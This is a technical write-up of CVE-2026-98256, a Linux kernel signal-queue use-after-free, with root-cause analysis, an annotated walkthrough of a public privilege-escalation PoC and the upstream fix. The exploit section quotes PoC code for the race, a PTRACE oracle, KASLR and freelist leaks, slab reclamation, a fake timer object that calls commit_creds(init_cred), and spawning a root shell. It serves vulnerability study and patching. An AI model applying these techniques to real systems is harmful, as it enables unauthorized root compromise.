<p align="center">
  <img src="../assets/tux.png" width="550" alt="tux">
</p>

# Intro

CVE-2026-98256 is a use-after-free vulnerability caused by incorrect cleanup of the private pending signal queue when a thread other than the leader calls `exec()`. While the list of the dying old leader is being drained, the same `sigqueue` is linked again into the queue of the surviving exec thread, corrupting the list. The freed entry is later referenced again in the signal handling path and corrupts kernel memory.

The public PoC turns this use-after-free into a full local privilege escalation. Starting as an unprivileged user, it exploits a vulnerable Ubuntu 26.04 `7.0.0-30-generic` system and launches a root shell.

This document explains the root cause of the vulnerability and the exploit flow of the Ubuntu PoC.

# Background

Linux stores signals sent to a process in the shared pending queue of `signal_struct` and signals sent to a specific thread in the private pending queue of `task_struct`. Each queue consists of a pending bitmask and a list of `struct sigqueue` objects. A POSIX timer signal links the preallocated `sigq` in `struct k_itimer` into this list.

A `SIGEV_THREAD_ID` signal enters the private queue of the TID specified through `PIDTYPE_PID`. The `sigq` of a blocked signal remains in the queue and keeps a reference to the `k_itimer`. Even when a thread other than the leader calls `exec()` and inherits the PID of the old leader, a node already linked into a pending list is not moved automatically.

In a valid signal list, links between neighboring entries must agree in both directions. When an entry is inserted into or removed from a queue, the kernel holds the `sighand->siglock` that protects that queue. The vulnerable path assumes that no accessor can remain for the private pending queue of a dead task and drains it without the lock. It overlooks that a signal callback can still access the same entry after the PID exchange.

# Root Cause

In the public PoC, the old leader exits through `SYS_exit` immediately after creating a worker thread that is not the group leader. `exit_signals()` sets `PF_EXITING`, but the vulnerable kernel neither drains the private pending queue at this point nor prevents `PIDTYPE_PID` signal queueing to a task with `PF_EXITING`. The worker can therefore queue timer signals to the TID of the old leader, which is already a zombie, leaving the embedded `sigq` objects in its private pending queue.

When the worker later calls `exec()`, `de_thread()` in the vulnerable Ubuntu source exchanges the PIDs of the worker and the old leader, then removes the leader.

```c
static int de_thread(struct task_struct *tsk)
{
	[...]
	if (!thread_group_leader(tsk)) {
		struct task_struct *leader = tsk->group_leader;

		[...]
		exchange_tids(tsk, leader);                     // <=[1]
		transfer_pid(leader, tsk, PIDTYPE_TGID);
		transfer_pid(leader, tsk, PIDTYPE_PGID);
		transfer_pid(leader, tsk, PIDTYPE_SID);

		[...]
		release_task(leader);                           // <=[2]
	}
	[...]
}
```

At `[1]`, the value of `it_pid` remains unchanged, but the task association of that `struct pid` changes to the exec thread. The `sigq` remains on the pending list of the zombie leader, and `[2]` removes the old leader.

```c
void release_task(struct task_struct *p)
{
	[...]
	write_lock_irq(&tasklist_lock);
	ptrace_release_task(p);
	__exit_signal(&post, p);
	[...]
	write_unlock_irq(&tasklist_lock);

	[...]
	flush_sigqueue(&p->pending);                       // <=[3]
	if (thread_group_leader(p))
		flush_sigqueue(&p->signal->shared_pending);
	[...]
}
```

At `[3]`, `sighand->siglock` is not held. A callback can, however, use the exchanged PID to find the exec thread and insert the same `sigq` into the queue of the new leader.

`flush_sigqueue()` removes an entry with `list_del_init()`. The self initialization performed by `list_del_init()` after disconnecting the neighboring links does not update `next` and `prev` in one operation.

```c
void flush_sigqueue(struct sigpending *queue)
{
	struct sigqueue *q;

	sigemptyset(&queue->signal);
	while (!list_empty(&queue->list)) {
		q = list_entry(queue->list.next, struct sigqueue , list);
		list_del_init(&q->list);
		__sigqueue_free(q);
	}
}
```

The list initialization called by `list_del_init()` is shown below.

```c
static inline void INIT_LIST_HEAD(struct list_head *list)
{
	WRITE_ONCE(list->next, list);                       // <=[4]
	WRITE_ONCE(list->prev, list);
}
```

Immediately after `[4]` stores `q->next = q`, `q->prev` still contains the value from the old queue. If the callback runs at this moment, `posixtimer_send_sigqueue()` obtains the live exec thread through the exchanged PID.

```c
static inline int list_empty(const struct list_head *head)
{
	return READ_ONCE(head->next) == head;               // <=[5]
}
```

The callback's target lookup and queue insertion are shown below.

```c
static inline struct task_struct *posixtimer_get_target(struct k_itimer *tmr)
{
	struct task_struct *t = pid_task(tmr->it_pid, tmr->it_pid_type);

	if (t && tmr->it_pid_type != PIDTYPE_PID &&
	    same_thread_group(t, current) && !current->exit_state)
		t = current;
	return t;
}

void posixtimer_send_sigqueue(struct k_itimer *tmr)
{
	struct sigqueue *q = &tmr->sigq;
	[...]
	t = posixtimer_get_target(tmr);                      // <=[6]
	if (!t)
		return;
	[...]
	if (unlikely(!list_empty(&q->list))) {
		[...]
		result = TRACE_SIGNAL_ALREADY_PENDING;
		goto out;
	}
	[...]
	posixtimer_queue_sigqueue(q, t, tmr->it_pid_type);  // <=[7]
	[...]
}
```

At `[5]`, only `next` is read, so the callback considers the entry unlinked. At `[6]`, it obtains the exec thread, which is now the new leader, and `[7]` links the same `q` into that thread's private pending queue.

Immediately afterward, the lockless flush stores `q->prev = q`, overwriting the new backward link. The pending list of the exec thread retains a link to `q`, but `q->prev` points to itself.

A successful exec cleans up the timer and its pending signal. The corrupted entry fails the `CONFIG_LIST_HARDENED` check, but `CONFIG_BUG_ON_DATA_CORRUPTION` is disabled on the target kernel, so the unlink operation is skipped and execution continues.

```c
static void __flush_itimer_signals(struct sigpending *pending)
{
	sigset_t signal, retain;
	struct sigqueue *q, *n;

	[...]
	list_for_each_entry_safe(q, n, &pending->list, list) {
		int sig = q->info.si_signo;

		if (likely(q->info.si_code != SI_TIMER)) {
			sigaddset(&retain, sig);
		} else {
			sigdelset(&signal, sig);
			list_del_init(&q->list);                  // <=[8]
			__sigqueue_free(q);
		}
	}
	[...]
}
```

When `__sigqueue_free()` drops the last reference, execution reaches the following free function.

```c
void posixtimer_free_timer(struct k_itimer *tmr)
{
	put_pid(tmr->it_pid);
	if (tmr->sigq.ucounts)
		dec_rlimit_put_ucounts(tmr->sigq.ucounts, UCOUNT_RLIMIT_SIGPENDING);
	kfree_rcu(tmr, rcu);                                // <=[9]
}
```

At `[8]`, the entry is not detached from the pending head, but `__sigqueue_free()` still drops the signal reference. Because the timer ownership reference has also been dropped, `[9]` frees the object through RCU, leaving a freed `sigq` linked from the pending head.

The PoC reads this stale entry with `PTRACE_PEEKSIGINFO` without removing it, then reclaims the freed object to control the later signal handling flow.

# Exploit

The PoC uses the stale `sigqueue` as an oracle that can be read without consuming it, then reclaims the slab page that contained the freed `k_itimer` with a page that user space can modify. It calculates the KASLR slide and creates a fake signal queue that passes the `LIST_HARDENED` checks. The signal dequeue path interprets this entry as a POSIX timer signal and invokes `commit_creds(init_cred)`.

On the tested target with four vCPUs, `sizeof(struct k_itimer)` is `0x180`, while `sigq.list` and `hrtimer.function` are at offsets `0x88` and `0x108`. Because of `SLAB_HWCACHE_ALIGN`, `mnt_cache` has an object stride of `0x180` and is merged with `posix_timers_cache`. An order 1 slab holds 21 objects, and the preserved freelist word at `0xb0` overlaps `sigq.info + 16`. The addresses of `posix_timer_fn`, `commit_creds`, and `init_cred` in the target System.map also match the constants in the PoC.

## 1. Racing the pending signal queue

The original leader exits only its own thread immediately after creating the worker. After 20 ms, the worker creates up to 20,000 `SIGEV_THREAD_ID` POSIX timers targeting the TID of the zombie leader and expires them at an absolute time in the past. Because the signal was blocked in advance, the embedded `sigq` of each timer remains in the old leader's private pending queue.

```c
static void *exec_worker(void *unused)
{
	[...]
	usleep(20000);
	[...]
	for (int i = 0; i < TIMER_SPRAY_COUNT; i++) {
		ids[i] = ktimer_create_for_tid(old_leader_tid,
					       0x28000000 | (i & 0x00ffffff));
		if (ids[i] < 0 || ktimer_arm_abs(ids[i], 1)) // <=[10]
			break;
		made++;
	}
	[...]
	pin_cpu(CALLBACK_CPU);
	[...]
	syscall(SYS_execveat, exe_fd, "", argv, environ, AT_EMPTY_PATH);
	execv("/proc/thread-self/exe", argv);
	_exit(2);
}

static __attribute__((noreturn)) void run_one_attempt(void)
{
	pthread_t exec_thread;

	old_leader_tid = (pid_t)syscall(SYS_gettid);
	if (pthread_create(&exec_thread, NULL, exec_worker, NULL)) {
		_exit(2);
	}

	syscall(SYS_exit, 0);
	__builtin_unreachable();
}
```

At `[10]`, `ktimer_arm_abs()` immediately expires a timer created for the old leader and queues a signal in the private queue of that leader despite `PF_EXITING`.

The worker rearms the timers far into the future, then reschedules as many as 12,288 of them in groups around the exec point. The worker and the lockless flush run on CPU0. Targeted membarrier IPIs from CPU2 and CPU3 repeatedly create interrupt boundaries on CPU0, giving the local hrtimer callback opportunities to interrupt the flush. If the callback runs after the self pointer is stored in `q->next` but before it is stored in `q->prev`, a stale entry remains in the pending queue of the new leader.

## 2. PTRACE oracle and object reclamation

The PoC must detect the stale entry without dequeuing it. A parent with the same uid stops the child and copies `siginfo` from the private pending queue through `PTRACE_PEEKSIGINFO`. This operation neither removes the entry nor drops the signal reference.

```c
static int parent_peek_stopped(pid_t child, uint64_t off,
			       struct probe_reply *reply)
{
	struct peeksiginfo_args args = {
		.off = off,
		.flags = 0,
		.nr = 1,
	};
	long ret;

	[...]
	ret = ptrace(PTRACE_PEEKSIGINFO, child, &args, &reply->info); // <=[11]
	[...]
	return ret == 1 ? 0 : -ENOENT;
}
```

The `off` at `[11]` is the queue entry index. The PoC skips the sentinel and looks for a stale entry with `SI_TIMER` and a matching tag.

After advancing the RCU batch, the PoC allocates timers in bulk. When a new tag appears in the oracle, the same `k_itimer` slot has been reused.

Before the target is reused following its first free, the PoC reads the encoded pointer to the next free object. It reuses the target slot, frees it again as the freelist tail, then reads the encoded NULL value from the same word. Because the storage address and cache random value are identical, XORing these values reveals the address of the next object.

```c
	[...]
	encoded_freelist_link = siginfo_word(&reply.info, 16);

	[...]
	(void)syscall(SYS_timer_delete, post_spray_ids[reclaimed_index]);
	post_spray_ids[reclaimed_index] = -1;
	[...]
	encoded_freelist_null = siginfo_word(&reply.info, 16);
	neighbor_object_addr = encoded_freelist_link ^ encoded_freelist_null; // <=[12]
	if ((neighbor_object_addr >> 48) != 0xffff ||
	    (neighbor_object_addr & 0x1fffULL) % 0x180 ||
	    (neighbor_object_addr & 0x1fffULL) / 0x180 > 20)
		cleanup_and_park_on_failure("geometry");
	[...]
```

From the value recovered at `[12]`, the PoC calculates the slab base aligned to 8 KiB and a slot from 0 through 20. It verifies that the value is a canonical kernel address, has the correct object alignment, and falls within the valid slot range before using it during page reclamation.

## 3. Reclaiming the slab page and disclosing addresses

The target slab must be emptied in a particular order. The PoC frees the core region around the target while retaining the objects in the outer guard band, preventing the order 1 slab from coalescing into a larger block in the buddy allocator. Objects remaining in RCU sheaves and barns are pushed out with separate fillers and cache cycling. A prepared set of pipe pages is then returned all at once to push pages in the per-CPU page list into the buddy allocator.

The parent writes markers that combine a serial number and every possible slot number into as many as 8,192 pipe pages. After allocating each page, it reads the oracle and checks whether that marker appears at the stale `siginfo` location. Once it finds a match, it drains the winning pipe and immediately calls `io_setup(1)` to reclaim the same page as an AIO ring mapped into user space.

```c
	[...]
	for (int i = 0; i < used[winning_pipe]; i++) {
		if (read_full(parent_search_pipes[winning_pipe][0], drain,
			      sizeof(drain)) != sizeof(drain))
			return -(errno ? errno : EIO);
	}
	if (syscall(SYS_io_setup, 1, &parent_mapped_context))
		return -errno;
	unsigned char *mapped_user =
		(unsigned char *)(uintptr_t)parent_mapped_context;
	int remap_serial = 0x00f001;

	parent_prepare_low_page(mapped_user, slab_base, remap_serial, 0);
	if (parent_peek_stopped(child, stale_off, reply) ||
	    siginfo_word(&reply->info, 16) !=
		    parent_aio_marker(remap_serial, stale_slot)) { // <=[13]
		err = -ESTALE;
		goto drop_ring;
	}
	[...]
```

At `[13]`, the PoC checks whether the marker written into the AIO mapping can be read back through the stale pointer. Only after this check succeeds does it conclude that the user mapping and the page of the freed `k_itimer` are the same page.

If the stale slot is from 0 through 10, the entry is in the lower page of the slab. The PoC points the next entry of the stale list just before the boundary and reads the surviving `hrtimer.function` from the adjacent upper page through `PTRACE_PEEKSIGINFO`. It calculates the KASLR slide from this value, sprays fake queue candidates across several pipe pages, and reads a cookie at `stale_off + 1` to identify that adjacent page.

If the slot is from 11 through 20, the upper page containing the entry has itself been reclaimed by the pipe and AIO allocations, destroying the function pointer from the same slab. In this case, the PoC adjusts the stale list pointer and reads the values at offsets `0x108` and `0x288` from a nearby `posix_timers_cache` slab base. It accepts the KASLR slide only when both locations contain the same `posix_timer_fn` address and the calculated slide passes the 2 MiB alignment and range checks.

## 4. Replacing cred with a fake signal queue

On the reclaimed pages controlled by user space, the PoC builds a fully linked cycle between the stale entry `S`, the fake timer queue `Q`, and the decoy entry `D`.

```
S.next = Q      S.prev = D
Q.next = D      Q.prev = S
D.next = S      D.prev = Q
```

```c
static void parent_build_fake_page(unsigned char *page, uint64_t slab_base,
				   uint64_t fake_page, int stale_slot,
				   size_t timer_offset, size_t decoy_offset,
				   uint64_t slide, int serial,
				   uint64_t cookie[4])
{
	uint64_t kclock = fake_page + 0x200;
	uint64_t pivot = fake_page + 0x300;
	uint64_t queue = fake_page + timer_offset + 0x88;
	uint64_t decoy = fake_page + decoy_offset;
	uint64_t stale = slab_base + (uint64_t)stale_slot * 0x180 + 0x88;

	[...]
	store_u64(page, timer_offset + 0x88, decoy);
	store_u64(page, timer_offset + 0x90, stale);
	store_u32(page, timer_offset + 0x98, 1);
	store_s32(page, timer_offset + 0xa0, timer_signal);
	store_s32(page, timer_offset + 0xa4, 0);
	store_s32(page, timer_offset + 0xa8, SI_TIMER);
	store_u64(page, decoy_offset, stale);
	store_u64(page, decoy_offset + 8, queue);
	store_s32(page, decoy_offset + 0x18, timer_signal);

	store_u64(page, timer_offset, kernel_symbols.init_cred + slide);
	store_u64(page, timer_offset + 8, pivot);
	store_u64(page, timer_offset + 0x10,
		  kernel_symbols.commit_creds + slide);
	store_u64(page, timer_offset + 0x30, 0);
	store_u64(page, timer_offset + 0x38, kclock);
	store_u32(page, timer_offset + 0x40, 0);
	store_u32(page, timer_offset + 0x44, 2);
	store_u64(page, timer_offset + 0x50, 0);
	store_u64(page, timer_offset + 0x58, 0);
	store_u32(page, timer_offset + 0x60, 0);
	store_u32(page, timer_offset + 0x64, 0);
	store_u64(page, timer_offset + 0x68, 1);
	store_u64(page, timer_offset + 0x80, 0);
	store_u64(page, timer_offset + 0xd0, 0);
	store_u32(page, timer_offset + 0xd8, 1);
	store_u64(page, 0x250, kernel_symbols.call_gadget + slide);
	store_u64(page, 0x318, kernel_symbols.commit_creds + slide);
}
```

The PoC sets the signal number of `S` to 0, sets `SIGQUEUE_PREALLOC` and `SI_TIMER` on `Q`, and gives `D` the same signal number as `Q`. The signal walk therefore skips `S` and selects `Q`. Because all neighbor links among the three entries agree, `list_del_init(Q)` also passes the `LIST_HARDENED` checks. The fake `k_itimer` contains matching sequence values, the requeue pending state, an interval other than 0, and a fake `k_clock`. The raw `rcuref` value 1 represents two references, so the fake object is not freed after delivery drops one of them.

When signal delivery dequeues `Q`, `container_of()` interprets it as the embedded `sigq` of the fake `k_itimer`. The normal delivery code in the target kernel calls a callback in `kclock` to rearm the interval timer.

```c
static bool __posixtimer_deliver_signal(struct kernel_siginfo *info, struct k_itimer *timr)
{
	guard(spinlock)(&timr->it_lock);

	[...]
	if (timr->it_signal_seq != timr->it_sigqueue_seq || WARN_ON_ONCE(!posixtimer_valid(timr)))
		return false;

	if (!timr->it_interval || WARN_ON_ONCE(timr->it_status != POSIX_TIMER_REQUEUE_PENDING))
		return true;

	timr->kclock->timer_rearm(timr);                    // <=[14]
	timr->it_status = POSIX_TIMER_ARMED;
	[...]
	return true;
}
```

The indirect call at `[14]` targets the gadget whose address in the target binary is `0xffffffff81cb2d20` before the KASLR slide is applied. The gadget loads `init_cred` and the pivot from the fake timer, then branches to `commit_creds` stored at the pivot. The return address of the original indirect call remains intact, so execution returns normally to signal delivery after `commit_creds(init_cred)` completes.

To reach the fake queue, the PoC lowers the soft limit of `RLIMIT_SIGPENDING` to 0. Even when allocation of a new `sigqueue` fails, an `SI_USER` signal with a number in the range reserved for POSIX real-time signals still sets the pending bit. This starts the dequeue walk in `rt_sigtimedwait` without adding a new entry to the list or changing the fake cycle.

```c
static __attribute__((noreturn)) void trigger_fake_timer_and_finish(void)
{
	[...]
	limit.rlim_cur = 0;
	if (setrlimit(RLIMIT_SIGPENDING, &limit))
		goto failed;
	[...]
	if (syscall(SYS_rt_tgsigqueueinfo, pid, tid, timer_signal, &info))
		goto failed;

	result = syscall(SYS_rt_sigtimedwait, &mask, NULL, &timeout,
			 sizeof(mask));                           // <=[15]
	if (result != timer_signal || geteuid() || getuid())
		goto failed;
	[...]
}
```

At `[15]`, the kernel finds the signal corresponding to the pending bit and dequeues `Q`. Because `Q` has the `SIGQUEUE_PREALLOC` and `SI_TIMER` attributes, `dequeue_signal()` calls `posixtimer_deliver_signal()`, and the current task receives root credentials through `[14]`. The PoC proceeds to the shell stage only after confirming that both `getuid()` and `geteuid()` return 0.

## 5. Separating the root shell from the corrupted task

The private pending queue of the privileged task remains corrupted. If this task exits, the kernel traverses the poisoned list again, so the PoC does not launch a shell directly from it or terminate it normally.

```c
	[...]
	result = syscall(SYS_clone, (unsigned long)SIGCHLD, NULL, NULL, NULL,
			 0UL);                                     // <=[16]
	if (!result)
		run_root_shell();
	if (result < 0) {
		cleanup_and_park_on_failure("root clone");
	}

	for (int i = 0; i < post_spray_count; i++) {
		if (post_spray_ids[i] >= 0)
			(void)syscall(SYS_timer_delete, post_spray_ids[i]);
	}
	park_poisoned_queue();
```

The child created at `[16]` inherits the root credentials but receives a newly initialized private pending queue. This child restores `RLIMIT_SIGPENDING`, CPU affinity, the signal mask, and the `SIGCHLD` disposition, then creates another child. The second child restores the remaining signal dispositions and launches `/bin/bash -i`, falling back to `/bin/sh -i` if necessary.

The corrupted task deletes the remaining timers and waits permanently on a futex. The controller that owns the AIO ring and pipe pages also remains alive to preserve the fake objects.

# Patch

This vulnerability was fixed by upstream commit `d2710c8d938a`. The patch sets `PF_EXITING` and detaches the private pending queue within the same `sighand->siglock` critical section in `exit_signals()`, then frees the detached list outside the lock. It also prevents new `PIDTYPE_PID` signals from being queued to a task with `PF_EXITING` and removes the lockless flush of the private pending queue from `release_task()`.

The essential upstream change is shown below.

```diff
diff --git a/kernel/exit.c b/kernel/exit.c
--- a/kernel/exit.c
+++ b/kernel/exit.c
@@ -302,12 +302,13 @@ void release_task(struct task_struct *p)
[...]
-	flush_sigqueue(&p->pending);
 	if (thread_group_leader(p))
 		flush_sigqueue(&p->signal->shared_pending);
[...]
diff --git a/kernel/signal.c b/kernel/signal.c
--- a/kernel/signal.c
+++ b/kernel/signal.c
@@ -457,18 +457,42 @@ static void __sigqueue_free(struct sigqueue *q)
[...]
+static void sigqueue_dequeue_pending(struct sigpending *queue, struct list_head *head)
+{
+	sigemptyset(&queue->signal);
+	list_splice_init(&queue->list, head);
+}
+
[...]
@@ -1019,6 +1043,21 @@ static inline bool legacy_queue(struct sigpending *signals, int sig)
[...]
+static inline bool task_can_queue_signal(struct task_struct *t, enum pid_type type)
+{
+	lockdep_assert_held(&t->sighand->siglock);
+
+	if (!(t->flags & PF_EXITING))
+		return true;
+
+	return type != PIDTYPE_PID;
+}
+
[...]
@@ -1030,6 +1069,10 @@ static int __send_signal_locked(int sig, struct kernel_siginfo *info,
[...]
+	if (!task_can_queue_signal(t, type))
+		goto ret;
[...]
@@ -2002,6 +2059,9 @@ void posixtimer_send_sigqueue(struct k_itimer *tmr)
[...]
+	if (!task_can_queue_signal(t, tmr->it_pid_type))
+		goto unlock;
[...]
@@ -2093,6 +2153,7 @@ void posixtimer_send_sigqueue(struct k_itimer *tmr)
[...]
+unlock:
[...]
@@ -3132,42 +3193,36 @@ static void retarget_shared_pending(struct task_struct *tsk, sigset_t *which)
[...]
+	LIST_HEAD(sigq_list);
 	int group_stop = 0;
-	sigset_t unblocked;
[...]
+	scoped_guard(spinlock_irq, &tsk->sighand->siglock) {
 		tsk->flags |= PF_EXITING;
[...]
+		sigqueue_dequeue_pending(&tsk->pending, &sigq_list);
[...]
+		if (task_sigpending(tsk) && !thread_group_empty(tsk) &&
+		    !(tsk->signal->flags & SIGNAL_GROUP_EXIT)) {
+			sigset_t unblocked = tsk->blocked;
[...]
+			signotset(&unblocked);
+			retarget_shared_pending(tsk, &unblocked);
[...]
+		}
+	}
[...]
+	cgroup_threadgroup_change_end(tsk);
+
+	flush_sigqueue_list(&sigq_list);
[...]
```

Now, when the old leader begins exiting, its private pending list is detached under `siglock`, and a sender that acquires the same lock observes `PF_EXITING` and discards a new signal directed to that thread. Even if a callback finds the live new leader after the PID exchange, it no longer races with a late lockless flush of the old leader.
